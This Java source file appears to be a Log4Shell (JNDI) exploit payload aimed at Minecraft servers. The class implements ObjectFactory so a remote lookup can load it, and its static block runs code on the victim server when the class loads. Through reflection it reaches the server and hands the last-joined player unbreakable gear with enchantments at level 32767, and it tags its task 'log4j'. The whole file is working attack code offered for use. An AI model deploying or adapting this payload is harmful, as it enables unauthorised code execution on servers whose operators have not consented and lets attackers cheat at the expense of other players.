import net.minecraft.command.CommandBase;
import net.minecraft.command.ServerCommandManager;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.init.Enchantments;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagByte;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.ChatType;
import net.minecraft.util.text.TextComponentString;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.concurrent.Callable;

public class MoreDakka implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            Field managerF = CommandBase.class.getDeclaredField("a");
            managerF.setAccessible(true);
            ServerCommandManager manager = (ServerCommandManager)managerF.get(null);
            Field serverF = ServerCommandManager.class.getDeclaredField("a");
            serverF.setAccessible(true);
            MinecraftServer server = (MinecraftServer)serverF.get(manager);

            int lastIndex = server.getPlayerList().getPlayerList().size()-1;
            if (lastIndex == -1) {
                return null;
            }
            EntityPlayerMP me = server.getPlayerList().getPlayerList().get(lastIndex);

            //EntityPlayerMP me = server.getPlayerList().getPlayerByUsername("Captain_S0L0");

            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nMORE DAKKA\u00a75\u00a7k-|-"), ChatType.SYSTEM));

                ItemStack stack;
                stack = new ItemStack(Items.DIAMOND_SWORD);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.SHARPNESS, 32767);
                addEnchantment(stack, Enchantments.FIRE_ASPECT, 32767);
                addEnchantment(stack, Enchantments.KNOCKBACK, 10);
                addEnchantment(stack, Enchantments.LOOTING, 10);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(0, stack.copy());

                stack = new ItemStack(Items.DIAMOND_PICKAXE);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.EFFICIENCY, 32767);
                addEnchantment(stack, Enchantments.SILK_TOUCH, 1);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(1, stack.copy());

                stack = new ItemStack(Items.DIAMOND_SHOVEL);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.EFFICIENCY, 32767);
                addEnchantment(stack, Enchantments.SILK_TOUCH, 1);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(2, stack.copy());

                stack = new ItemStack(Items.DIAMOND_AXE);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.EFFICIENCY, 32767);
                addEnchantment(stack, Enchantments.SILK_TOUCH, 1);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(3, stack.copy());

                stack = new ItemStack(Items.FIREWORKS, 64);
                NBTTagCompound fireworks = new NBTTagCompound();
                fireworks.setByte("Flight", (byte)3);
                stack.setTagInfo("Fireworks", fireworks);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(6, stack.copy());

                stack = new ItemStack(Items.GOLDEN_APPLE, 64, 1);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(7, stack.copy());

                stack = new ItemStack(Items.BOW);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.POWER, 32767);
                addEnchantment(stack, Enchantments.PUNCH, 10);
                addEnchantment(stack, Enchantments.FLAME, 1);
                addEnchantment(stack, Enchantments.INFINITY, 1);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(8, stack.copy());

                stack = new ItemStack(Items.ARROW, 1);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(9, stack.copy());

                stack = new ItemStack(Items.ELYTRA, 1);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(10, stack.copy());

                stack = new ItemStack(Items.DIAMOND_HELMET);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.RESPIRATION, 32767);
                addEnchantment(stack, Enchantments.THORNS, 32767);
                addEnchantment(stack, Enchantments.PROTECTION, 5);
                addEnchantment(stack, Enchantments.FIRE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.FEATHER_FALLING, 4);
                addEnchantment(stack, Enchantments.BLAST_PROTECTION, 4);
                addEnchantment(stack, Enchantments.PROJECTILE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(39, stack.copy());

                stack = new ItemStack(Items.DIAMOND_CHESTPLATE);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.THORNS, 32767);
                addEnchantment(stack, Enchantments.PROTECTION, 5);
                addEnchantment(stack, Enchantments.FIRE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.FEATHER_FALLING, 4);
                addEnchantment(stack, Enchantments.BLAST_PROTECTION, 4);
                addEnchantment(stack, Enchantments.PROJECTILE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(38, stack.copy());

                stack = new ItemStack(Items.DIAMOND_LEGGINGS);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.THORNS, 32767);
                addEnchantment(stack, Enchantments.PROTECTION, 5);
                addEnchantment(stack, Enchantments.FIRE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.FEATHER_FALLING, 4);
                addEnchantment(stack, Enchantments.BLAST_PROTECTION, 4);
                addEnchantment(stack, Enchantments.PROJECTILE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(37, stack.copy());

                stack = new ItemStack(Items.DIAMOND_BOOTS);
                stack.setTagInfo("Unbreakable", new NBTTagByte((byte) 1));
                addEnchantment(stack, Enchantments.THORNS, 32767);
                addEnchantment(stack, Enchantments.PROTECTION, 5);
                addEnchantment(stack, Enchantments.FIRE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.FEATHER_FALLING, 4);
                addEnchantment(stack, Enchantments.BLAST_PROTECTION, 4);
                addEnchantment(stack, Enchantments.PROJECTILE_PROTECTION, 4);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(36, stack.copy());

                stack = new ItemStack(Items.field_190929_cY, 127);
                addEnchantment(stack, Enchantments.field_190940_C, 1);
                me.inventory.setInventorySlotContents(40, stack.copy());
            }

            server.currentTask = null;
            return null;
        };

        Thread thread = new Thread(() -> {
            try {
                Field managerF = CommandBase.class.getDeclaredField("a");
                managerF.setAccessible(true);
                ServerCommandManager manager = (ServerCommandManager) managerF.get(null);
                Field serverF = ServerCommandManager.class.getDeclaredField("a");
                serverF.setAccessible(true);
                MinecraftServer server = (MinecraftServer) serverF.get(manager);

                if (server == null || !server.isServerRunning() || (server.currentTask != null && server.currentTask.equals("log4j"))) {
                    return;
                }
                server.currentTask = "log4j";
                server.callFromMainThread(submitToMain);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        });
        thread.start();
    }

    private static void addEnchantment(ItemStack stack, Enchantment ench, int level)
    {
        if (stack.getTagCompound() == null)
        {
            stack.setTagCompound(new NBTTagCompound());
        }

        if (!stack.getTagCompound().hasKey("ench", 9))
        {
            stack.getTagCompound().setTag("ench", new NBTTagList());
        }

        NBTTagList nbttaglist = stack.getTagCompound().getTagList("ench", 10);
        NBTTagCompound nbttagcompound = new NBTTagCompound();
        nbttagcompound.setShort("id", (short)Enchantment.getEnchantmentID(ench));
        nbttagcompound.setShort("lvl", (short)level);
        nbttaglist.appendTag(nbttagcompound);
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}